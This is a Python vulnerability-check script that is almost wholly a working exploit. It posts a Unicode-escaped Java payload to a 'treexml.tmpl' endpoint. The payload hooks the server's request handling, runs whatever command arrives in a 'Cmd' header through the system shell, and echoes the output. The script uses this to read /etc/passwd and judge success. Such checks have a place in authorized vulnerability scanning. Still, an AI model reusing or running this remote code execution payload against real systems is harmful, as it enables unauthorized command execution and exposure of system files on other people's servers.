import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"data/sys-common/treexml.tmpl"
	body=r"s_bean=ruleFormulaValidate&script=\u0020\u0020\u0020\u0020\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u0020\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0066\u0061\u006c\u0073\u0065\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0020\u0067\u0072\u006f\u0075\u0070\u0020\u003d\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0028\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0072\u0065\u0066\u006c\u0065\u0063\u0074\u002e\u0046\u0069\u0065\u006c\u0064\u0020\u0066\u0020\u003d\u0020\u0067\u0072\u006f\u0075\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0020\u003d\u0020\u0028\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0029\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0067\u0072\u006f\u0075\u0070\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u0069\u0020\u003d\u0020\u0030\u003b\u0020\u0069\u0020\u003c\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u003b\u0020\u0069\u002b\u002b\u0029\u0020\u007b\u0020\u0074\u0072\u0079\u0020\u007b\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u0020\u0074\u0020\u003d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u005b\u0069\u005d\u003b\u0069\u0066\u0020\u0028\u0074\u0020\u003d\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0073\u0074\u0072\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u004e\u0061\u006d\u0065\u0028\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0065\u0078\u0065\u0063\u0022\u0029\u0020\u007c\u007c\u0020\u0021\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0068\u0074\u0074\u0070\u0022\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0061\u0072\u0067\u0065\u0074\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0074\u0029\u003b\u0069\u0066\u0020\u0028\u0021\u0028\u006f\u0062\u006a\u0020\u0069\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u006f\u0066\u0020\u0052\u0075\u006e\u006e\u0061\u0062\u006c\u0065\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0069\u0073\u0024\u0030\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0020\u003d\u0020\u0028\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0029\u0020\u0028\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u006a\u0020\u003d\u0020\u0030\u003b\u0020\u006a\u0020\u003c\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0073\u0069\u007a\u0065\u0028\u0029\u003b\u0020\u002b\u002b\u006a\u0029\u0020\u007b\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0067\u0065\u0074\u0028\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0072\u0065\u0071\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0071\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0073\u0070\u0020\u003d\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u0030\u005d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u0030\u005d\u0029\u003b\u0073\u0074\u0072\u0020\u003d\u0020\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u0029\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0048\u0065\u0061\u0064\u0065\u0072\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0022\u0043\u006d\u0064\u0022\u007d\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0026\u0026\u0020\u0021\u0073\u0074\u0072\u002e\u0069\u0073\u0045\u006d\u0070\u0074\u0079\u0028\u0029\u0029\u0020\u007b\u0020\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0053\u0074\u0061\u0074\u0075\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0032\u0030\u0030\u0029\u007d\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u0020\u0063\u006d\u0064\u0073\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0022\u002c\u0020\u0022\u002f\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u0020\u003a\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u002f\u0062\u0069\u006e\u002f\u0073\u0068\u0022\u002c\u0020\u0022\u002d\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u0022\u0047\u0042\u004b\u0022\u003a\u0022\u0055\u0054\u0046\u002d\u0038\u0022\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0074\u0065\u0078\u0074\u0032\u0020\u003d\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u0053\u0063\u0061\u006e\u006e\u0065\u0072\u0028\u0028\u006e\u0065\u0077\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0063\u006d\u0064\u0073\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u002c\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u0029\u002e\u0075\u0073\u0065\u0044\u0065\u006c\u0069\u006d\u0069\u0074\u0065\u0072\u0028\u0022\u005c\u005c\u0041\u0022\u0029\u002e\u006e\u0065\u0078\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0072\u0065\u0073\u0075\u006c\u0074\u003d\u0028\u0022\u0045\u0078\u0065\u0063\u0075\u0074\u0065\u003a\u0020\u0020\u0020\u0020\u0022\u002b\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0074\u0065\u0078\u0074\u0032\u002c\u0022\u0075\u0074\u0066\u002d\u0038\u0022\u0029\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0074\u006f\u006d\u0063\u0061\u0074\u002e\u0075\u0074\u0069\u006c\u002e\u0062\u0075\u0066\u002e\u0042\u0079\u0074\u0065\u0043\u0068\u0075\u006e\u006b\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u003b\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006f\u0062\u006a\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0030\u0029\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0072\u0065\u0073\u0075\u006c\u0074\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u0029\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u004d\u0065\u0074\u0068\u006f\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0076\u0061\u0072\u0035\u0029\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006a\u0061\u0076\u0061\u002e\u006e\u0069\u006f\u002e\u0042\u0079\u0074\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0077\u0072\u0061\u0070\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0063\u006c\u0073\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0074\u0072\u0075\u0065\u003b\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0020\u007d"
	headers={'Content-Type': 'application/x-www-form-urlencoded', 'Pragma': 'no-cache', 'Cmd': 'cat /etc/passwd'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:[^:]*:[0-9]*:[0-9]*:[^:]*",response.text):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
